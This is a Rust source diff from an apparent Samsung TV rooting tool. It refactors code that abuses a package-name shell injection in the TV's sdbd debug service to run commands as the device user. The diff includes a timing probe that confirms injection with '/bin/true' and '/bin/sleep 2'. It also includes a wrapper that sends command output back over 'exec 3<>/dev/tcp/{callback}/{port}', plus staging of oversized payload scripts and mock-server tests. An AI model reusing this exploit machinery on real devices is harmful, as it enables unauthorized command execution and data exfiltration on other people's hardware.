@@ -88,14 +88,20 @@ pub fn injection_argument_size(command: &str) -> Result<usize> {
 /// immediately, which is surfaced as a specific error instead of a generic
 /// callback timeout.
 pub fn require_shell_injection(target: &str, options: &Options) -> Result<()> {
+    let mut device = Device::connect(target, options).map_err(Error::sdb)?;
+    require_shell_injection_on(&mut device, options.timeout)
+}
+
+/// Same probe on an existing connection, so a root session uses one transport.
+pub fn require_shell_injection_on(device: &mut Device, timeout: Duration) -> Result<()> {
     const MINIMUM_DELTA: Duration = Duration::from_millis(1500);
-    let timeout = options.timeout.max(Duration::from_secs(7));
-    let (mut control_elapsed, control) = timed_injection(target, options, "/bin/true", timeout)?;
-    let (mut delayed_elapsed, delayed) = timed_injection(target, options, "/bin/sleep 2", timeout)?;
+    let timeout = timeout.max(Duration::from_secs(7));
+    let (mut control_elapsed, control) = timed_injection_on(device, "/bin/true", timeout)?;
+    let (mut delayed_elapsed, delayed) = timed_injection_on(device, "/bin/sleep 2", timeout)?;
     let mut delta = delayed_elapsed.saturating_sub(control_elapsed);
     if delta < MINIMUM_DELTA && control_elapsed >= MINIMUM_DELTA {
-        let (again_control, _) = timed_injection(target, options, "/bin/true", timeout)?;
-        let (again_delayed, _) = timed_injection(target, options, "/bin/sleep 2", timeout)?;
+        let (again_control, _) = timed_injection_on(device, "/bin/true", timeout)?;
+        let (again_delayed, _) = timed_injection_on(device, "/bin/sleep 2", timeout)?;
         control_elapsed = again_control;
         delayed_elapsed = again_delayed;
         delta = delayed_elapsed.saturating_sub(control_elapsed);
@@ -123,14 +129,13 @@ pub fn require_shell_injection(target: &str, options: &Options) -> Result<()> {
     Ok(())
 }
 
-fn timed_injection(
-    target: &str,
-    options: &Options,
+fn timed_injection_on(
+    device: &mut Device,
     command: &str,
     timeout: Duration,
 ) -> Result<(Duration, Vec<u8>)> {
     let started = Instant::now();
-    let result = inject_once(target, options, command);
+    let result = inject(device, command);
     let elapsed = started.elapsed();
     match result {
         Ok(output) => {
@@ -138,11 +143,6 @@ fn timed_injection(
                 return Err(Error::protocol("SDB injection timed out"));
             }
             Ok((elapsed, output))
-        }
-        Err(Error::Sdb(error)) if error.to_string().contains("refused service") => {
-            Err(Error::protocol(format!(
-                "SDB is connected, but the package-name shell injection is blocked by this TV's sdbd plugin ({error}); no root route can start"
-            )))
         }
         Err(error) => Err(error),
     }
@@ -169,10 +169,23 @@ pub fn inject_once(target: &str, options: &Options, command: &str) -> Result<Vec
     inject(&mut device, command)
 }
 
-/// Captures one command's output through a TCP callback.
+/// Captures one command's output through a TCP callback on a fresh connection.
 pub fn capture(
     target: &str,
     options: &Options,
+    command: &str,
+    config: &CaptureConfig,
+) -> Result<Capture> {
+    let mut device = Device::connect(target, options).map_err(Error::sdb)?;
+    capture_on(&mut device, target, command, config)
+}
+
+/// Captures one command's output through a TCP callback on an existing
+/// connection. The staged script (if any) and the injection share this
+/// connection, matching Samsung sdb's session behavior.
+pub fn capture_on(
+    device: &mut Device,
+    target: &str,
     command: &str,
     config: &CaptureConfig,
 ) -> Result<Capture> {
@@ -198,12 +211,16 @@ pub fn capture(
     };
     let marker = exit_marker(&token);
     let wrapped = format!(
-        "exec 3<>/dev/tcp/{callback}:{port};{{ {command}; }} >&3 2>&3;printf '\\n{marker}%s]\\n' \"$?\" >&3;exec 3>&-"
+        "exec 3<>/dev/tcp/{callback}/{port};{{ {command}; }} >&3 2>&3;printf '\\n{marker}%s]\\n' \"$?\" >&3;exec 3>&-"
     );
-    let launch = if injection_argument_size(&wrapped)? > CAPTURE_DIRECT_MAX_SAFE_BYTES {
-        stage_script(target, options, &wrapped)?
+    let staged = if injection_argument_size(&wrapped)? > CAPTURE_DIRECT_MAX_SAFE_BYTES {
+        Some(prepare_staged_script(&wrapped)?)
     } else {
-        wrapped
+        None
+    };
+    let launch = match &staged {
+        Some((_, remote)) => format!(". {remote}"),
+        None => wrapped,
     };
     if injection_argument_size(&launch)? > APPINSTALL_MAX_SAFE_BYTES {
         return Err(Error::protocol(
@@ -211,66 +228,73 @@ pub fn capture(
         ));
     }
 
-    let target_owned = target.to_owned();
-    let options = options.clone();
     let launch_for_thread = launch.clone();
-    let mut injection = Some(std::thread::spawn(move || -> Result<()> {
-        inject_once(&target_owned, &options, &launch_for_thread).map(|_| ())
-    }));
-
+    let staged_for_thread = staged;
     listener.set_nonblocking(true)?;
     let deadline = Instant::now() + config.timeout;
-    let (mut stream, peer) = loop {
-        match listener.accept() {
-            Ok(accepted) => break accepted,
-            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
-                // A refused or failed injection can never produce a callback.
-                // Surface that error immediately instead of waiting out the
-                // whole callback deadline.
-                if injection
-                    .as_ref()
-                    .is_some_and(std::thread::JoinHandle::is_finished)
-                {
-                    let finished = injection.take().expect("checked above");
-                    match finished.join() {
-                        Ok(Ok(())) => {}
-                        Ok(Err(error)) => return Err(error),
-                        Err(_) => return Err(Error::protocol("injection thread panicked")),
-                    }
+    std::thread::scope(|scope| {
+        let mut injection = Some(scope.spawn({
+            let device = &mut *device;
+            move || -> Result<()> {
+                if let Some((path, remote)) = staged_for_thread {
+                    let pushed = device.push(&path, &remote).map_err(Error::sdb);
+                    let _ = std::fs::remove_file(path);
+                    pushed?;
                 }
-                if Instant::now() >= deadline {
-                    return Err(Error::protocol(
-                        "TV did not connect to the callback within the deadline; check the inbound firewall and Developer Mode host IP",
-                    ));
-                }
-                std::thread::sleep(Duration::from_millis(20));
+                inject(device, &launch_for_thread).map(|_| ())
             }
-            Err(error) => return Err(Error::sdb(error)),
-        }
-    };
-    if !ips.contains(&peer.ip()) {
-        return Err(Error::protocol(format!(
-            "callback came from {}, not the resolved TV address",
-            peer.ip()
-        )));
-    }
-    stream.set_nonblocking(false)?;
-    let remaining = deadline.saturating_duration_since(Instant::now());
-    if remaining.is_zero() {
-        return Err(Error::protocol("TV callback deadline expired"));
-    }
-    stream.set_read_timeout(Some(remaining))?;
-    let output = read_bounded(&mut stream, config.max_output, deadline)?;
-    let _ = stream.shutdown(Shutdown::Both);
+        }));
 
-    if let Some(injection) = injection {
-        injection
-            .join()
-            .map_err(|_| Error::protocol("injection thread panicked"))??;
-    }
-    Ok(Capture {
-        output: String::from_utf8_lossy(&output).into_owned(),
-        marker_token: token,
+        let (mut stream, peer) = loop {
+            match listener.accept() {
+                Ok(accepted) => break accepted,
+                Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
+                    // A failed injection can never produce a callback.
+                    if injection
+                        .as_ref()
+                        .is_some_and(std::thread::ScopedJoinHandle::is_finished)
+                    {
+                        let finished = injection.take().expect("checked above");
+                        match finished.join() {
+                            Ok(Ok(())) => {}
+                            Ok(Err(error)) => return Err(error),
+                            Err(_) => return Err(Error::protocol("injection thread panicked")),
+                        }
+                    }
+                    if Instant::now() >= deadline {
+                        return Err(Error::protocol(
+                            "TV did not connect to the callback within the deadline; check the inbound firewall and Developer Mode host IP",
+                        ));
+                    }
+                    std::thread::sleep(Duration::from_millis(20));
+                }
+                Err(error) => return Err(Error::sdb(error)),
+            }
+        };
+        if !ips.contains(&peer.ip()) {
+            return Err(Error::protocol(format!(
+                "callback came from {}, not the resolved TV address",
+                peer.ip()
+            )));
+        }
+        stream.set_nonblocking(false)?;
+        let remaining = deadline.saturating_duration_since(Instant::now());
+        if remaining.is_zero() {
+            return Err(Error::protocol("TV callback deadline expired"));
+        }
+        stream.set_read_timeout(Some(remaining))?;
+        let output = read_bounded(&mut stream, config.max_output, deadline)?;
+        let _ = stream.shutdown(Shutdown::Both);
+
+        if let Some(injection) = injection {
+            injection
+                .join()
+                .map_err(|_| Error::protocol("injection thread panicked"))??;
+        }
+        Ok(Capture {
+            output: String::from_utf8_lossy(&output).into_owned(),
+            marker_token: token,
+        })
     })
 }
 
@@ -331,7 +355,10 @@ fn read_bounded(stream: &mut TcpStream, maximum: usize, deadline: Instant) -> Re
     }
 }
 
-fn stage_script(target: &str, options: &Options, wrapped: &str) -> Result<String> {
+/// Writes a staged capture script locally. The caller must push it and then
+/// inject `. <remote>` on the *same* sdbd connection: the TV's shell handling
+/// can depend on the connection that received the staged file.
+fn prepare_staged_script(wrapped: &str) -> Result<(std::path::PathBuf, String)> {
     let remote = format!("{REMOTE_SCRIPT_DIR}/.tv-root-capture-{}.sh", random_hex(8)?);
     let path = std::env::temp_dir().join(format!(
         "tv-root-capture-{}-{}.sh",
@@ -340,13 +367,7 @@ fn stage_script(target: &str, options: &Options, wrapped: &str) -> Result<String
     ));
     let script = format!("/bin/rm -f {remote}\n{wrapped}\n");
     std::fs::write(&path, script)?;
-    let result = (|| {
-        let mut device = Device::connect(target, options).map_err(Error::sdb)?;
-        device.push(&path, &remote).map_err(Error::sdb)?;
-        Ok(format!(". {remote}"))
-    })();
-    let _ = std::fs::remove_file(&path);
-    result
+    Ok((path, remote))
 }
 
 pub fn exit_marker(token: &str) -> String {
@@ -474,7 +495,7 @@ mod tests {
     }
 
     #[test]
-    fn a_blocked_foothold_is_reported_specifically() {
+    fn a_short_circuited_foothold_is_not_confirmed() {
         let sdb = TcpListener::bind("127.0.0.1:0").unwrap();
         let target = sdb.local_addr().unwrap().to_string();
         let server = std::thread::spawn(move || {
@@ -484,11 +505,13 @@ mod tests {
             stream
                 .write_all(&Frame::new(CNXN, 0x0200_0000, 4096, *b"device::FAKE::0\0").encode())
                 .unwrap();
-            let open = Frame::read(&mut stream).unwrap();
-            assert_eq!(open.command, OPEN);
-            stream
-                .write_all(&Frame::new(CLSE, 0, open.arg0, Vec::new()).encode())
-                .unwrap();
+            for _ in 0..2 {
+                let open = Frame::read(&mut stream).unwrap();
+                assert_eq!(open.command, OPEN);
+                stream
+                    .write_all(&Frame::new(CLSE, 0, open.arg0, Vec::new()).encode())
+                    .unwrap();
+            }
         });
         let error = require_shell_injection(
             &target,
@@ -501,7 +524,7 @@ mod tests {
         assert!(
             error
                 .to_string()
-                .contains("blocked by this TV's sdbd plugin"),
+                .contains("package-name shell execution was not confirmed"),
             "{error}"
         );
         server.join().unwrap();
@@ -541,7 +564,7 @@ mod tests {
     }
 
     #[test]
-    fn a_refused_injection_does_not_wait_for_the_callback_deadline() {
+    fn a_failed_injection_does_not_wait_for_the_callback_deadline() {
         let sdb = TcpListener::bind("127.0.0.1:0").unwrap();
         let target = sdb.local_addr().unwrap().to_string();
         let server = std::thread::spawn(move || {
@@ -553,9 +576,7 @@ mod tests {
                 .unwrap();
             let open = Frame::read(&mut stream).unwrap();
             assert_eq!(open.command, OPEN);
-            stream
-                .write_all(&Frame::new(CLSE, 0, open.arg0, Vec::new()).encode())
-                .unwrap();
+            drop(stream); // simulate a lost injection, not a completed shell CLSE
         });
         let started = Instant::now();
         let error = capture(
@@ -573,7 +594,7 @@ mod tests {
             },
         )
         .unwrap_err();
-        assert!(error.to_string().contains("refused service"), "{error}");
+        assert!(error.to_string().contains("closed by TV"), "{error}");
         assert!(started.elapsed() < Duration::from_secs(3));
         server.join().unwrap();
     }
@@ -606,7 +627,8 @@ mod tests {
             .unwrap()
             .split(';')
             .next()
-            .unwrap();
+            .unwrap()
+            .replacen('/', ":", 1);
         let mut callback = TcpStream::connect(callback).unwrap();
         callback
             .write_all(b"hello\n[exit:deadbeefdeadbeef:0]\n")
